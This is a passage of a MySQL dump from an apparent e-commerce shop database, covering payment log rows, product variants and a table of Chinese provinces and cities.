INSERT INTO `ec22703249_pay_log` VALUES ('264', '318', '0.01', '0', '1');
INSERT INTO `ec22703249_pay_log` VALUES ('265', '7', '10.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('266', '8', '10.00', '1', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('267', '319', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('268', '320', '0.01', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('269', '1', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('270', '2', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('271', '3', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('272', '4', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('273', '5', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('274', '6', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('275', '7', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('276', '8', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('277', '9', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('278', '10', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('279', '0', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('280', '11', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('281', '12', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('282', '13', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('283', '14', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('284', '15', '700.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('285', '16', '715.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('286', '17', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('287', '18', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('288', '19', '690.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('289', '1', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('290', '2', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('291', '3', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('292', '4', '18.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('293', '5', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('294', '6', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('295', '7', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('296', '8', '0.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('297', '9', '10.00', '0', '0');
INSERT INTO `ec22703249_pay_log` VALUES ('298', '12', '0.00', '0', '0');

-- ----------------------------
-- Table structure for `ec22703249_plugins`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_plugins`;
CREATE TABLE `ec22703249_plugins` (
  `code` varchar(30) NOT NULL DEFAULT '',
  `version` varchar(10) NOT NULL DEFAULT '',
  `library` varchar(255) NOT NULL DEFAULT '',
  `assign` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `install_date` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`code`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_plugins
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_products`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_products`;
CREATE TABLE `ec22703249_products` (
  `product_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_attr` varchar(50) DEFAULT NULL,
  `product_sn` varchar(60) DEFAULT NULL,
  `product_number` smallint(5) unsigned DEFAULT '0',
  PRIMARY KEY (`product_id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_products
-- ----------------------------
INSERT INTO `ec22703249_products` VALUES ('1', '10', '69|76', 'e150150150', '1000');
INSERT INTO `ec22703249_products` VALUES ('2', '10', '70|77', 'e160160160', '1000');
INSERT INTO `ec22703249_products` VALUES ('3', '10', '71|78', 'e170170170', '1000');
INSERT INTO `ec22703249_products` VALUES ('4', '10', '72|79', 'e180180180', '1000');

-- ----------------------------
-- Table structure for `ec22703249_region`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_region`;
CREATE TABLE `ec22703249_region` (
  `region_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `region_name` varchar(120) NOT NULL DEFAULT '',
  `region_type` tinyint(1) NOT NULL DEFAULT '2',
  `agency_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`region_id`),
  KEY `parent_id` (`parent_id`),
  KEY `region_type` (`region_type`),
  KEY `agency_id` (`agency_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3409 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_region
-- ----------------------------
INSERT INTO `ec22703249_region` VALUES ('1', '0', '中国', '0', '0');
INSERT INTO `ec22703249_region` VALUES ('2', '1', '北京', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('3', '1', '安徽', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('4', '1', '福建', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('5', '1', '甘肃', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('6', '1', '广东', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('7', '1', '广西', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('8', '1', '贵州', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('9', '1', '海南', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('10', '1', '河北', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('11', '1', '河南', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('12', '1', '黑龙江', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('13', '1', '湖北', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('14', '1', '湖南', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('15', '1', '吉林', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('16', '1', '江苏', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('17', '1', '江西', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('18', '1', '辽宁', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('19', '1', '内蒙古', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('20', '1', '宁夏', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('21', '1', '青海', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('22', '1', '山东', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('23', '1', '山西', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('24', '1', '陕西', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('25', '1', '上海', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('26', '1', '四川', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('27', '1', '天津', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('28', '1', '西藏', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('29', '1', '新疆', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('30', '1', '云南', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('31', '1', '浙江', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('32', '1', '重庆', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('33', '1', '香港', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('34', '1', '澳门', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('35', '1', '台湾', '1', '0');
INSERT INTO `ec22703249_region` VALUES ('36', '3', '安庆', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('37', '3', '蚌埠', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('38', '3', '巢湖', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('39', '3', '池州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('40', '3', '滁州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('41', '3', '阜阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('42', '3', '淮北', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('43', '3', '淮南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('44', '3', '黄山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('45', '3', '六安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('46', '3', '马鞍山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('47', '3', '宿州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('48', '3', '铜陵', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('49', '3', '芜湖', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('50', '3', '宣城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('51', '3', '亳州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('52', '2', '北京', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('53', '4', '福州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('54', '4', '龙岩', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('55', '4', '南平', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('56', '4', '宁德', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('57', '4', '莆田', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('58', '4', '泉州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('59', '4', '三明', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('60', '4', '厦门', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('61', '4', '漳州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('62', '5', '兰州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('63', '5', '白银', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('64', '5', '定西', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('65', '5', '甘南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('66', '5', '嘉峪关', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('67', '5', '金昌', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('68', '5', '酒泉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('69', '5', '临夏', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('70', '5', '陇南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('71', '5', '平凉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('72', '5', '庆阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('73', '5', '天水', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('74', '5', '武威', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('75', '5', '张掖', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('76', '6', '广州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('77', '6', '深圳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('78', '6', '潮州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('79', '6', '东莞', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('80', '6', '佛山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('81', '6', '河源', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('82', '6', '惠州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('83', '6', '江门', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('84', '6', '揭阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('85', '6', '茂名', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('86', '6', '梅州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('87', '6', '清远', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('88', '6', '汕头', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('89', '6', '汕尾', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('90', '6', '韶关', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('91', '6', '阳江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('92', '6', '云浮', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('93', '6', '湛江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('94', '6', '肇庆', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('95', '6', '中山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('96', '6', '珠海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('97', '7', '南宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('98', '7', '桂林', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('99', '7', '百色', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('100', '7', '北海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('101', '7', '崇左', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('102', '7', '防城港', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('103', '7', '贵港', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('104', '7', '河池', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('105', '7', '贺州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('106', '7', '来宾', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('107', '7', '柳州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('108', '7', '钦州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('109', '7', '梧州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('110', '7', '玉林', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('111', '8', '贵阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('112', '8', '安顺', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('113', '8', '毕节', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('114', '8', '六盘水', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('115', '8', '黔东南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('116', '8', '黔南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('117', '8', '黔西南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('118', '8', '铜仁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('119', '8', '遵义', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('120', '9', '海口', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('121', '9', '三亚', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('122', '9', '白沙', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('123', '9', '保亭', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('124', '9', '昌江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('125', '9', '澄迈县', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('126', '9', '定安县', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('127', '9', '东方', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('128', '9', '乐东', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('129', '9', '临高县', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('130', '9', '陵水', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('131', '9', '琼海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('132', '9', '琼中', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('133', '9', '屯昌县', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('134', '9', '万宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('135', '9', '文昌', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('136', '9', '五指山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('137', '9', '儋州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('138', '10', '石家庄', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('139', '10', '保定', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('140', '10', '沧州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('141', '10', '承德', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('142', '10', '邯郸', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('143', '10', '衡水', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('144', '10', '廊坊', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('145', '10', '秦皇岛', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('146', '10', '唐山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('147', '10', '邢台', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('148', '10', '张家口', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('149', '11', '郑州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('150', '11', '洛阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('151', '11', '开封', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('152', '11', '安阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('153', '11', '鹤壁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('154', '11', '济源', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('155', '11', '焦作', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('156', '11', '南阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('157', '11', '平顶山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('158', '11', '三门峡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('159', '11', '商丘', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('160', '11', '新乡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('161', '11', '信阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('162', '11', '许昌', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('163', '11', '周口', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('164', '11', '驻马店', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('165', '11', '漯河', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('166', '11', '濮阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('167', '12', '哈尔滨', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('168', '12', '大庆', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('169', '12', '大兴安岭', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('170', '12', '鹤岗', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('171', '12', '黑河', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('172', '12', '鸡西', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('173', '12', '佳木斯', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('174', '12', '牡丹江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('175', '12', '七台河', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('176', '12', '齐齐哈尔', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('177', '12', '双鸭山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('178', '12', '绥化', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('179', '12', '伊春', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('180', '13', '武汉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('181', '13', '仙桃', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('182', '13', '鄂州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('183', '13', '黄冈', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('184', '13', '黄石', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('185', '13', '荆门', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('186', '13', '荆州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('187', '13', '潜江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('188', '13', '神农架林区', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('189', '13', '十堰', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('190', '13', '随州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('191', '13', '天门', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('192', '13', '咸宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('193', '13', '襄樊', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('194', '13', '孝感', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('195', '13', '宜昌', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('196', '13', '恩施', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('197', '14', '长沙', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('198', '14', '张家界', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('199', '14', '常德', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('200', '14', '郴州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('201', '14', '衡阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('202', '14', '怀化', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('203', '14', '娄底', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('204', '14', '邵阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('205', '14', '湘潭', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('206', '14', '湘西', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('207', '14', '益阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('208', '14', '永州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('209', '14', '岳阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('210', '14', '株洲', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('211', '15', '长春', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('212', '15', '吉林', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('213', '15', '白城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('214', '15', '白山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('215', '15', '辽源', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('216', '15', '四平', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('217', '15', '松原', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('218', '15', '通化', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('219', '15', '延边', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('220', '16', '南京', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('221', '16', '苏州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('222', '16', '无锡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('223', '16', '常州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('224', '16', '淮安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('225', '16', '连云港', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('226', '16', '南通', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('227', '16', '宿迁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('228', '16', '泰州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('229', '16', '徐州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('230', '16', '盐城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('231', '16', '扬州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('232', '16', '镇江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('233', '17', '南昌', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('234', '17', '抚州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('235', '17', '赣州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('236', '17', '吉安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('237', '17', '景德镇', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('238', '17', '九江', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('239', '17', '萍乡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('240', '17', '上饶', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('241', '17', '新余', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('242', '17', '宜春', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('243', '17', '鹰潭', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('244', '18', '沈阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('245', '18', '大连', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('246', '18', '鞍山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('247', '18', '本溪', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('248', '18', '朝阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('249', '18', '丹东', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('250', '18', '抚顺', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('251', '18', '阜新', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('252', '18', '葫芦岛', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('253', '18', '锦州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('254', '18', '辽阳', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('255', '18', '盘锦', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('256', '18', '铁岭', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('257', '18', '营口', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('258', '19', '呼和浩特', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('259', '19', '阿拉善盟', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('260', '19', '巴彦淖尔盟', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('261', '19', '包头', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('262', '19', '赤峰', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('263', '19', '鄂尔多斯', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('264', '19', '呼伦贝尔', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('265', '19', '通辽', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('266', '19', '乌海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('267', '19', '乌兰察布市', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('268', '19', '锡林郭勒盟', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('269', '19', '兴安盟', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('270', '20', '银川', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('271', '20', '固原', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('272', '20', '石嘴山', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('273', '20', '吴忠', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('274', '20', '中卫', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('275', '21', '西宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('276', '21', '果洛', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('277', '21', '海北', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('278', '21', '海东', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('279', '21', '海南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('280', '21', '海西', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('281', '21', '黄南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('282', '21', '玉树', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('283', '22', '济南', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('284', '22', '青岛', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('285', '22', '滨州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('286', '22', '德州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('287', '22', '东营', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('288', '22', '菏泽', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('289', '22', '济宁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('290', '22', '莱芜', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('291', '22', '聊城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('292', '22', '临沂', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('293', '22', '日照', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('294', '22', '泰安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('295', '22', '威海', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('296', '22', '潍坊', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('297', '22', '烟台', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('298', '22', '枣庄', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('299', '22', '淄博', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('300', '23', '太原', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('301', '23', '长治', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('302', '23', '大同', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('303', '23', '晋城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('304', '23', '晋中', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('305', '23', '临汾', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('306', '23', '吕梁', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('307', '23', '朔州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('308', '23', '忻州', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('309', '23', '阳泉', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('310', '23', '运城', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('311', '24', '西安', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('312', '24', '安康', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('313', '24', '宝鸡', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('314', '24', '汉中', '2', '0');
INSERT INTO `ec22703249_region` VALUES ('315', '24', '商洛', '2', '0');
